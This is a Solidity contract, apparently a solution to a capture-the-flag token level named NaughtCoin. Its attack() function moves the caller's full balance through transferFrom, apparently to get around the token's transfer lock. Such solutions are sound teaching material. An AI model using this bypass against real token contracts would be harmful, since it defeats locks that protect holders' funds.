// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./NaughtCoin.sol";


 contract Attacker {

    NaughtCoin public naughtCoin;
    
    constructor(address _contract) {
        naughtCoin = NaughtCoin(_contract);
    }

    function attack() public {
        uint userBalance = naughtCoin.balanceOf(msg.sender);
        naughtCoin.transferFrom(msg.sender, address(this), userBalance);
    }
} 